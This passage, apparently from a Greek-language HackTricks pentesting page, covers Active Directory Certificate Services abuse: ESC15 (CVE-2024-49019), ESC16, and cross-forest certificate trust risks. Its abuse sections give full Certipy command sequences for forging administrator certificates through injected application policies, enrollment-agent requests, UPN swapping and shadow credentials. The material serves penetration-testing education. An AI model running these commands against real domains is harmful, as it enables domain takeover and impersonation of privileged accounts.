Για πιο συγκεκριμένες μεθόδους επίθεσης σε διάφορα σενάρια επίθεσης, παρακαλώ ανατρέξτε στα παρακάτω: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Πολιτικές Εφαρμογής(CVE-2024-49019) - ESC15

### Επεξήγηση

Η περιγραφή στο https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc είναι εξαιρετικά λεπτομερής. Παρακάτω ακολουθεί απόσπασμα από το αρχικό κείμενο.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Κατάχρηση

The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

Η εντολή Certipy's `find` μπορεί να βοηθήσει στον εντοπισμό προτύπων V1 που ενδέχεται να είναι ευάλωτα στο ESC15 εάν ο CA δεν έχει επιδιορθωθεί.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Σενάριο A: Άμεση απομίμηση μέσω Schannel

**Βήμα 1: Ζητήστε ένα πιστοποιητικό, εισάγοντας την "Client Authentication" Application Policy και το στοχευόμενο UPN.** Ο Attacker `attacker@corp.local` στοχεύει τον `administrator@corp.local` χρησιμοποιώντας το πρότυπο "WebServer" V1 (το οποίο επιτρέπει enrollee-supplied subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Το ευάλωτο πρότυπο V1 με "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Εισάγει το OID `1.3.6.1.5.5.7.3.2` στην επέκταση Application Policies του CSR.
- `-upn 'administrator@corp.local'`: Θέτει το UPN στο SAN για υπόδυση ταυτότητας.

**Βήμα 2: Πιστοποίηση μέσω Schannel (LDAPS) χρησιμοποιώντας το αποκτηθέν πιστοποιητικό.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Σενάριο B: PKINIT/Kerberos Impersonation μέσω κατάχρησης Enrollment Agent

**Βήμα 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.** Αυτό το πιστοποιητικό προορίζεται για τον attacker (`attacker@corp.local`) ώστε να γίνει enrollment agent. Δεν καθορίζεται UPN για την ταυτότητα του attacker εδώ, καθώς ο στόχος είναι η ικανότητα ως enrollment agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Εισάγει OID `1.3.6.1.4.1.311.20.2.1`.

**Βήμα 2: Χρησιμοποιήστε το πιστοποιητικό "agent" για να ζητήσετε ένα πιστοποιητικό εκ μέρους ενός στοχευόμενου προνομιακού χρήστη.** Πρόκειται για ένα βήμα τύπου ESC3, χρησιμοποιώντας το πιστοποιητικό από το Βήμα 1 ως το πιστοποιητικό "agent".
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Βήμα 3: Πιστοποιηθείτε ως χρήστης με προνόμια χρησιμοποιώντας το πιστοποιητικό "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Εξήγηση

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** αναφέρεται στο σενάριο όπου, εάν η διαμόρφωση του AD CS δεν επιβάλλει την συμπερίληψη της επέκτασης **szOID_NTDS_CA_SECURITY_EXT** σε όλα τα πιστοποιητικά, ένας επιτιθέμενος μπορεί να το εκμεταλλευτεί με:

1. Κάνοντας αίτηση για πιστοποιητικό **χωρίς SID binding**.

2. Χρησιμοποιώντας αυτό το πιστοποιητικό **για αυθεντικοποίηση ως οποιοσδήποτε λογαριασμός**, όπως προσποιούμενος έναν λογαριασμό με υψηλά προνόμια (π.χ., Domain Administrator).

Μπορείτε επίσης να ανατρέξετε σε αυτό το άρθρο για να μάθετε περισσότερα για την λεπτομερή αρχή:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Κατάχρηση

Το ακόλουθο αναφέρεται στο [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), Click to see more detailed usage methods.

Για να προσδιορίσετε εάν το περιβάλλον Active Directory Certificate Services (AD CS) είναι ευάλωτο στο **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Βήμα 1: Διαβάστε το αρχικό UPN του λογαριασμού του θύματος (Προαιρετικό - για επαναφορά).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Βήμα 2: Ενημερώστε το UPN του λογαριασμού θύματος στο `sAMAccountName` του διαχειριστή-στόχου.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Βήμα 3: (Εάν χρειάζεται) Αποκτήστε credentials για τον λογαριασμό "victim" (π.χ., μέσω Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Βήμα 4: Ζητήστε ένα πιστοποιητικό ως ο χρήστης "victim" από _οποιοδήποτε κατάλληλο client authentication template_ (π.χ., "User") στον ESC16-ευάλωτο CA.** Επειδή ο CA είναι ευάλωτος στο ESC16, θα παραλείψει αυτόματα την επέκταση ασφαλείας SID από το εκδοθέν πιστοποιητικό, ανεξάρτητα από τις ειδικές ρυθμίσεις του προτύπου για αυτήν την επέκταση. Ορίστε την περιβάλλουσα μεταβλητή cache διαπιστευτηρίων Kerberos (εντολή shell):
```bash
export KRB5CCNAME=victim.ccache
```
Στη συνέχεια, ζητήστε το πιστοποιητικό:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Βήμα 5: Επαναφέρετε το UPN του λογαριασμού "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Βήμα 6: Αυθεντικοποιηθείτε ως διαχειριστής-στόχος.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Συμβιβασμός Forests με Πιστοποιητικά — Εξηγημένο σε Παθητική Φωνή

### Διάρρηξη των Forest Trusts από συμβιβασμένες CA

Η ρύθμιση για το **cross-forest enrollment** γίνεται σχετικά απλή. Το **root CA certificate** από το resource forest **δημοσιεύεται στα account forests** από τους διαχειριστές, και τα **enterprise CA** certificates από το resource forest **προστίθενται στα `NTAuthCertificates` και AIA containers σε κάθε account forest**. Για να διευκρινιστεί, αυτή η διάταξη παρέχει στο **CA στο resource forest πλήρη έλεγχο** πάνω σε όλα τα άλλα forests για τα οποία διαχειρίζεται το PKI. Εάν αυτό το CA **συμβιβαστεί από attackers**, πιστοποιητικά για όλους τους χρήστες τόσο στο resource όσο και στα account forests θα μπορούσαν να **πλαστογραφηθούν από αυτούς**, θραύοντας έτσι τα όρια ασφαλείας του forest.

### Enrollment Privileges Granted to Foreign Principals

Σε περιβάλλοντα με πολλά forest απαιτείται προσοχή σχετικά με Enterprise CAs που **δημοσιεύουν certificate templates** τα οποία επιτρέπουν σε **Authenticated Users ή foreign principals** (χρήστες/ομάδες εκτός του forest στο οποίο ανήκει το Enterprise CA) **δικαιώματα enrollment και edit**.  
Μετά την authentication μέσω ενός trust, το **Authenticated Users SID** προστίθεται στο token του χρήστη από το AD. Έτσι, εάν ένα domain διαθέτει ένα Enterprise CA με template που **επιτρέπει Authenticated Users δικαιώματα enrollment**, ένα template ενδέχεται να **εγγραφεί από έναν χρήστη από διαφορετικό forest**. Ομοίως, εάν **τα enrollment rights χορηγηθούν ρητά σε ένα foreign principal από ένα template**, δημιουργείται έτσι μια **cross-forest access-control relationship**, επιτρέποντας σε ένα principal από ένα forest να **εγγραφεί σε ένα template από άλλο forest**.

Και τα δύο σενάρια οδηγούν σε μια **αύξηση του attack surface** από ένα forest σε άλλο. Οι ρυθμίσεις του certificate template θα μπορούσαν να εκμεταλλευτούν από έναν επιτιθέμενο για να αποκτήσει επιπλέον προνόμια σε ένα foreign domain.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
